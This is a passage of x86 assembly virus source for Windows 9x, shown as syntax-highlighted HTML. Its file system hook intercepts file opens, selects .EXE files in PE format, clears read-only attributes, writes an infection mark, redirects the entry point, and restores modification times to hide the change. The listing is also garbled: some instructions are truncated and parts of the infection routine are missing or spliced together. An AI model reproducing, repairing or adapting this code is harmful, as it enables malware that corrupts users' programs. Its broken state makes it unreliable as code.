</span><span class="sc10">c</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Is OpenFile !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc1">; if ( NotOpenFile ) </span><span class="sc0">
</span><span class="sc4">***********************</span><span class="sc0"> 
</span><span class="sc1">; * Get FilePath's DriveNumber, * </span><span class="sc0">
</span><span class="sc1">; * then Set the DriveName to * </span><span class="sc0">
</span><span class="sc1">; * FileNameBuffer. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Ex. If DriveNumber is 03h, * </span><span class="sc0">
</span><span class="sc1">; * DriveName is 'C:'. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc1">; mov esi, offset FileNameBuffer </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileNameBuffer</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc0"> 

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0"> 
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CallUniToBCSPath</span><span class="sc0"> 

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * UniToBCSPath * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * This Service Converts * </span><span class="sc0">
</span><span class="sc1">; * a Canonicalized Unicode Pathname * </span><span class="sc0">
</span><span class="sc1">; * to a Normal Pathname in the * </span><span class="sc0">
</span><span class="sc1">; * Specified BCS Character Set. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">CallUniToBCSPath</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FileNameBufferSize</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; VXDCall UniToBCSPath </span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400041h</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Is FileName '.EXE' !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc1">; cmp [esi+eax-04h], '.EXE' </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0"> 

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Only for Debug * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc1">; cmp [esi+eax-06h], 'FUCK' </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'KCUF'</span><span class="sc0"> 
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0"> 

</span><span class="sc9">ENDIF</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Is Open Existing File !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc1">; if ( NotOpenExistingFile ) </span><span class="sc0">
</span><span class="sc1">; goto DisableOnBusy </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0"> 
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Get Attributes of the File * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0"> 
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Get IFSMgr_Ring0_FileIO Address * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Is Read-Only File !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0"> 
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Modify Read-Only File to Write * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0"> 
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Open File * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d5h</span><span class="sc0"> 
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; mov ebx, FileHandle </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Need to Restore * </span><span class="sc0">
</span><span class="sc1">; * Attributes of the File !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 

</span><span class="sc6">pushf</span><span class="sc0"> 

</span><span class="sc2">1h</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Is Open File OK !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">IsOpenFileOK</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">popf</span><span class="sc0"> 

</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Open File Already Succeed. ^__^ * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Push FileNameBuffer Address to Stack </span><span class="sc0">

</span><span class="sc6">pushf</span><span class="sc0"> </span><span class="sc1">; Now CF = 0, Push Flag to Stack </span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DataBuffer</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc0"> </span><span class="sc1">; mov esi, offset DataBuffe </span><span class="sc0">
</span><span class="sc5">r</span><span class="sc0"> 

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Get OffsetToNewHeader * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d6h</span><span class="sc0"> 

</span><span class="sc1">; For Doing Minimal VirusCode's Length, </span><span class="sc0">
</span><span class="sc1">; I Save EAX to EBP. </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0"> 
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Get 'PE\0' Signature * </span><span class="sc0">
</span><span class="sc1">; * of ImageFileHeader, and * </span><span class="sc0">
</span><span class="sc1">; * Infected Mark. * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Is PE !? * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Is the File * </span><span class="sc0">
</span><span class="sc1">; * Already Infected !? * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc1">; cmp [esi], '\0PE\0' </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00455000h</span><span class="sc0"> 
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * The File is ^o^ * </span><span class="sc0">
</span><span class="sc1">; * PE(Portable Executable) indeed. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * The File isn't also Infected. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Start to Infect the File * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Registers Use Status Now : * </span><span class="sc0">
</span><span class="sc1">; * * </span><span class="sc0">
</span><span class="sc1">; * EAX = 04h * </span><span class="sc0">
</span><span class="sc1">; * EBX = File Handle * </span><span class="sc0">
</span><span class="sc1">; * ECX = 04h * </span><span class="sc0">
</span><span class="sc1">; * EDX = 'PE\0\0' Signature of * </span><span class="sc0">
</span><span class="sc1">; * ImageFileHeader Pointer's * </span><span class="sc0">
</span><span class="sc1">; * Former Byte. * </span><span class="sc0">
</span><span class="sc1">; * ESI = DataBuffer Address == @8 * </span><span class="sc0">
</span><span class="sc1">; * EDI = IFSMgr_Ring0_FileIO Address * </span><span class="sc0">
</span><span class="sc1">; * EBP = D600h == Read Data in File * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Stack Dump : * </span><span class="sc0">
</span><span class="sc1">; * * </span><span class="sc0">
</span><span class="sc1">; * ESP = ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | EFLAG(CF=0) | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | FileNameBufferPointer | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | EDI | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | ESI | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | EBP | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | ESP | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | EBX | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | EDX | * </span><span class="sc0">
</span><span class="sc1">; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; * | ; * ------------------------- * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Save File Handle </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Set VirusCodeSectionTableEndMark </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Let's Set the * </span><span class="sc0">
</span><span class="sc1">; * Virus' Infected Mark * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; Size </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Pointer of File </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Address of Buffer </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Save ESP Register * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> 

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Let's Set the * </span><span class="sc0">
</span><span class="sc1">; * NewAddressOfEntryPoint * </span><span class="sc0">
</span><span class="sc1">; * ( Only First Set Size ) * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Size </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Let's Read * </span><span class="sc0">
</span><span class="sc1">; * Image Header in File * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeOfImageHeaderToRead</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc1">; Move EDX to NumberOfSections </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Let's Set the * </span><span class="sc0">
</span><span class="sc1">; * NewAddressOfEntryPoint * </span><span class="sc0">
</span><span class="sc1">; * ( Set Pointer of File, * </span><span class="sc0">
</span><span class="sc1">; * Address of Buffer ) * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">AddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Pointer of File </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NewAddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Address of Buffer </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Move EDX to the Start * </span><span class="sc0">
</span><span class="sc1">; * of SectionTable in File * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">SizeOfOptionalHeader</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Let's Get * </span><span class="sc0">
</span><span class="sc1">; * Total Size of Sections * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeOfScetionTable</span><span class="sc0"> 

</span><span class="sc1">; I Assume NumberOfSections * </span><span class="sc0">
</span><span class="sc1">; * Need to Restore File * </span><span class="sc0">
</span><span class="sc1">; * Modification Time * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc5">SetFileModificationMark</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc6">stc</span><span class="sc0"> </span><span class="sc1">; Enable CF(Carry Flag) </span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Close File * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d7h</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Need to Restore File Modification * </span><span class="sc0">
</span><span class="sc1">; * Time !? * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc6">popf</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0"> 

</span><span class="sc1">; **************************** mov ecx, (FileModificationTime-@7)[esi] </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FileModificationTime</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO </span><span class="sc0">

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Disable OnBusy * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">DisableOnBusy</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OnBusy</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Disable OnBu </span><span class="sc0">
</span><span class="sc5">sy</span><span class="sc0"> 

</span><span class="sc1">; ************************************* </span><span class="sc0">
</span><span class="sc1">; * Call Previous FileSystemApiHook * </span><span class="sc0">
</span><span class="sc1">; ************st. * </span><span class="sc0">
</span><span class="sc1">; ************************************* </span><span class="sc0">

</span><span class="sc5">pIFSFunc</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Push pioreq </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Call pIFSFun </span><span class="sc0">
</span><span class="sc10">c</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Modify EAX Value in Stack </span><span class="sc0">

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * After Calling pIFSFunc, * </span><span class="sc0">
</span><span class="sc1">; * Get Some Data from the * </span><span class="sc0">
</span><span class="sc1">; * Returned pioreq. * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000024h</span><span class="sc0"> 
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">QuitMyVirusFileSystemHook</span><span class="sc0"> 

</span><span class="sc1">; ***************** </span><span class="sc0">
</span><span class="sc1">; * Get the File * </span><span class="sc0">
</span><span class="sc1">; * Modification * </span><span class="sc0">
</span><span class="sc1">; * Date and Time * </span><span class="sc0">
</span><span class="sc1">; * in DOS Format.* </span><span class="sc0">
</span><span class="sc1">; ***************** </span><span class="sc0">

